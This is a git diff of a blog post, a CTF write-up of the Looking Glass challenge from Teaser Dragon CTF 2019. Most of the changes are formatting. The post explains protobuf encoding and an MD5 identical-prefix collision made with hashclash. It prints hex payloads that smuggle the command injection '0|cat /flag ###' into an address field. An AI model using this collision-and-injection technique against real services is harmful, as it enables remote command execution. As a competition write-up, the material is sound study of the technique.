@@ -3,7 +3,7 @@ layout: post
 title:  "Teaser Dragon CTF 2019"
 date:   2019-09-22 19:00:00 +0100
 categories: writeups ctf
-toc:    true
+toc:    false
 ---
 
 This weekend I participated with my team WreckTheLine in Teaser Dragon Sector CTF. I only had the opportunity to work on the Looking Glass challenge, so here's a short writeup. We didn't quite make it in time to submit the flag. My solution was 5 minutes late because of a mistake I made in the payload.
@@ -74,12 +74,13 @@ The thing is, we can see a loophole. `v.cache` is a LRU Cache mechanism, based o
 
 Well, first I had to understand the protobuf protocol. And it is quite simple. It's basically one byte for field id and field type. One byte for length. And then the data. It fails if you estimate to have more data. And it has unexpected results if you estimate less data (mostly fails).
 
-I used https://protogen.marcgravell.com/decode to play with protobuf and understand how it works.
+I used [https://protogen.marcgravell.com/decode](https://protogen.marcgravell.com/decode) to play with protobuf and understand how it works.
 
 `0A-10-0A-0A-67-6F-6F-67-6C-65-2E-63-6F-6D-10-01-18-04` is a payload for `ping` with `google.com` as address.
 
 ```
-Explanation
+EXPLANATION
+==============
 0A = field 1, type String - for ping. we have a different one for traceroute
 10 = length 16
 payload = 0A-0A-67-6F-6F-67-6C-65-2E-63-6F-6D-10-01-18-04
@@ -105,9 +106,9 @@ I also discovered that if we have the same field twice in our protobuf, the app 
 
 We now have a good understanding of how to tinker with protobuf protocol. Following this, we need to understand md5 collisions. I'll spare you the time involved in reading a lot about the subject and go closer to the end.
 
-We discovered a great article on md5 collisions https://github.com/corkami/collisions . It's insanely good and covers everything.
+We discovered a great article on md5 collisions [https://github.com/corkami/collisions](https://github.com/corkami/collisions). It's insanely good and covers everything.
 
-Basically there are two different attacks. Identical-Prefix Collision and Chosen-Prefix Collision. There's a good explanation for the first one at https://natmchugh.blogspot.com/2014/10/how-i-made-two-php-files-with-same-md5.html .
+Basically there are two different attacks. Identical-Prefix Collision and Chosen-Prefix Collision. There's a good explanation for the first one at [https://natmchugh.blogspot.com/2014/10/how-i-made-two-php-files-with-same-md5.html](https://natmchugh.blogspot.com/2014/10/how-i-made-two-php-files-with-same-md5.html).
 
 We tried Chosen-Prefix Collision with two different payloads (one good, one evil). We tried [hashclash](https://github.com/cr-marcstevens/hashclash). It took 2 hours and the final payload's length wasn't predictible. So I couldn't set a reliable length for it and the protobuf would fail.
 
@@ -123,7 +124,7 @@ SUFFIX
 0A-0A-2A-20-30-7C-63-61-74-20-2F-66-6C-61-67-20-23-23-23-23-23-23-23-23-23-23-23-23-23-23-23-23-23-23-23-23-2A-07-23-23-23-23-23-23-23
 ```
 
-And in between we had `128 - 12 = 116 chars` of data for the md5 collision. Ignore the first `0A` in the suffix, that was a mistake.
+And in between we had `128 - 12 = 116 chars` of data for the md5 collision. _Ignore the first `0A` in the suffix, that was a mistake._
 
 I used `0|cat /flag ###` for the address in the evil payload. This was a bit of a bet because I wasn't sure the flag would be there. Considering the hint and that it takes `~5 minutes` to generate another collision, I hoped it was there.
 
@@ -137,12 +138,12 @@ Evil - RCE cat /flag - 0x77 length
 0A-AA-01-0A-03-30-30-30-2A-77-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-0A-0A-2A-20-30-7C-63-61-74-20-2F-66-6C-61-67-20-23-23-23-23-23-23-23-23-23-23-23-23-23-23-23-23-23-23-23-23-2A-07-23-23-23-23-23-23-23
 ```
 
-You can check them both at https://protogen.marcgravell.com/decode and notice that the only difference is the 10th byte. It's very important after we have the collision to use first the one with `0x78` on the 10th byte, and then the other one.
+You can check them both at [https://protogen.marcgravell.com/decode](https://protogen.marcgravell.com/decode) and notice that the only difference is the 10th byte. It's very important after we have the collision to use first the one with `0x78` on the 10th byte, and then the other one.
 
 We use hashclash with Identical-Prefix Collision (UniColl) to get the two collisions.
 
 
-```bash
+```sh
 cd hashclash
 
 mkdir ipc_workdir
@@ -170,7 +171,7 @@ echo '=============='
 
 And the results are in after 4-5 minutes.
 
-```bash
+```sh
 $ md5sum col?.bin
 d7b627375239482857cedfdecf04c620  col1.bin
 d7b627375239482857cedfdecf04c620  col2.bin
